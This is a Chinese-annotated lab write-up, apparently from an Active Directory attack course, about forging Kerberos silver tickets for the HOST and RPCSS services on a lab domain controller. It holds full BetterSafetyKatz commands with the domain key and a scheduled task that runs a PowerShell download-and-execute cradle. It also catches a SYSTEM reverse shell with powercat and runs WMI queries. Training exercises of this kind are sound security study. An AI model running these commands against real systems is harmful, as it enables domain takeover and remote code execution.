Task
•  During the additional lab time, try to get command execution on the domain controller by creating silver ticket for:
−  HOST service
−  WMI

# HOST service

1. 在上一章已经知道哈希的DC的哈希，可以拿来制作银票


```
PS C:\Windows\system32> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   XBM12TNY 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "TBM5E1QRLOWYKWPH1K4" - (Y2ANO)
 ## / \ ##  /*** KT19X23KU3Q8KP `YYBFI59Z5K` ( 0BDY5EL0@YYBFI59Z5K.com )
 ## \ / ##       > https://blog.YYBFI59Z5K.com/XBM12TNY
 '## v ##'       H85GMP6N7Y0OLKO             ( 19203DFDXYB32HMMAYD9BQSP )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

XBM12TNY(commandline) # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
B6DYL9DKey: 36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb - aes256_hmac
B6DYL9D   : HOST
Target    : us-dc.us.techcorp.local
Lifetime  : 11/2/2022 8:35:21 PM ; 11/3/2022 6:35:21 AM ; 11/9/2022 8:35:21 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

XBM12TNY(commandline) # exit
Bye!
```


查看票据
```
PS C:\Windows\system32>  klist

Current LogonId is 0:0x493bd

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: HOST/us-dc.us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 11/2/2022 20:35:21 (local)
        End Time:   11/3/2022 6:35:21 (local)
        Renew Time: 11/9/2022 20:35:21 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

2. 另在学生机器，起一个监听，准备接收DC过来的rev shell

```
PS C:\ad\Tools> . C:\AD\Tools\powercat.ps1
PS C:\ad\Tools>  powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)

```

3. 在有银票的session下执行下面操作

```
PS C:\Windows\system32> schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User138" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.138/Invoke-PowerShellTcpEx.ps1''')'"
SUCCESS: The scheduled task "User138" has successfully been created.
```

4. 在学生机起一个http服务
```
PS C:\AD\Tools> python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...	
```

5. 修改Invoke-PowerShellTcpEx.ps1脚本，在最后一行加入
```
reverse -Reverse -IPAddress 192.168.100.138 -Port 443
```

6. 触发定时任务

```
schtasks /Run /S us-dc.us.techcorp.local /TN "User138"
```

7. 收到DC的rev shell
```
PS C:\ad\Tools>  powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.1.2] port  [tcp] accepted (source port 60807)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user US-DC$ on US-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
US-DC
```

# WMI

使用WMI，需要申请两张票据，一个是 HOST服务，一个是RPCSS服务


申请HOST服务

```
PS C:\Windows\system32> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   XB5K9H3A 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "UC5JJ6GZFDUVK3J9XV3" - (H29H5)
 ## / \ ##  /*** R0RWL38LUCXV50 `USZEJPKIZ8` ( 5J2ZONQQ@USZEJPKIZ8.com )
 ## \ / ##       > https://blog.USZEJPKIZ8.com/XB5K9H3A
 '## v ##'       GWMRK09CLN0E4LU             ( MRDUE1XUM13TR7Z8S2WQK0SZ )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

XB5K9H3A(commandline) # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
6B54FH2Key: 36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb - aes256_hmac
6B54FH2   : HOST
Target    : us-dc.us.techcorp.local
Lifetime  : 11/2/2022 8:53:13 PM ; 11/3/2022 6:53:13 AM ; 11/9/2022 8:53:13 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

XB5K9H3A(commandline) # exit
Bye!
```

申请RPCSS服务

```
PS C:\Windows\system32> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:RPCSS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   GBRAEA5Y 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "2U84J9RBXOJY5YNTO1W" - (2RHDC)
 ## / \ ##  /*** K6OEOUSAKKPN3M `691NZ2AV9Q` ( AGNJ9G6L@691NZ2AV9Q.com )
 ## \ / ##       > https://blog.691NZ2AV9Q.com/GBRAEA5Y
 '## v ##'       C6YG2OLO0JVF00Z             ( 2TRKCPEV6SWE8IS5BFBUYU1V )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

GBRAEA5Y(commandline) # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:RPCSS /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
YUN3FUGKey: 36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb - aes256_hmac
YUN3FUG   : RPCSS
Target    : us-dc.us.techcorp.local
Lifetime  : 11/2/2022 8:53:52 PM ; 11/3/2022 6:53:52 AM ; 11/9/2022 8:53:52 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

GBRAEA5Y(commandline) # exit
Bye!
```

使用wmi
```
PS C:\Windows\system32> Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 17763
RegisteredUser  : Windows User
SerialNumber    : 00429-90000-00001-AA056
Version         : 10.0.17763

```